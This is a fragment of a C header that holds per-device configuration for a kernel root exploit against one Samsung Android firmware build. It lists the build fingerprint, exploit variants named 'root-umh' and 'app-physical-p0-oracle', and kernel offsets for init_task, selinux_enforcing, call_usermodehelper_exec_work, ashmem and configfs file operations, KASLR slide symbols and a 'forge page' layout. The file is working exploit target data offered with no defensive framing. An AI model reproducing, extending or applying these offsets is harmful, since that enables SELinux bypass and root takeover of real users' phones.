...
#define BUILD_VARIANT_LABEL "m1q-S9420ZCS3AZF1-app-physical-p0-oracle"
#define APP_PHYS_P0_ORACLE 1
#else
#define BUILD_VARIANT_LABEL "m1q-S9420ZCS3AZF1-root-umh"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT "samsung/m1qzcx/m1q:16/BP4A.251205.006/S9420ZCS3AZF1_CHC3AZF1:user/release-keys"
#endif
...
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x00103878ULL
...
#define P0_FINGERPRINT_HEADER \
  "targets/m1q-S9420ZCS3AZF1/p0_fingerprint.h"
#endif
...
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000f8f0cULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00518e0cULL
#define CONFIGFS_READ_ITER_OFF 0x00518860ULL
#define COPY_SPLICE_READ_OFF 0x00342024ULL
#define INIT_TASK_OFF 0x0252d040ULL
#define KMALLOC_CACHES_OFF 0x019154c0ULL
#define NOOP_LLSEEK_OFF 0x0043fb48ULL
#define ROOT_TASK_GROUP_OFF 0x02763580ULL
#define SELINUX_ENFORCING_OFF 0x027afb08ULL
#define SYSTEM_UNBOUND_WQ_OFF 0x01915250ULL

/* ashmem — 6.12 Rust 重写 (ashmem_rust), 指针模式搜索验证 */
#define ASHMEM_FOPS_OFF 0x01462a78ULL
#define ASHMEM_IOCTL_OFF 0x00e0c724ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x00e0cd0cULL
#define ASHMEM_MMAP_OFF 0x00e0cd88ULL
#define ASHMEM_OPEN_OFF 0x00e0cde4ULL
#define ASHMEM_RELEASE_OFF 0x00e0c7e4ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00e0cce4ULL
#define ASHMEM_MISC_FOPS_OFF ASHMEM_FOPS_OFF

/* slide 辅助符号 */
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x01878cc0ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x025221c0ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x0264cf48ULL
...
/* === exploit 内核页布局 (forge page 内部偏移, 跨版本不变) === */
...
/* === struct page (BTF 验证: sizeof=0x40) === */
...
/* === file_operations 字段偏移 (BTF 验证: sizeof=0x108) === */
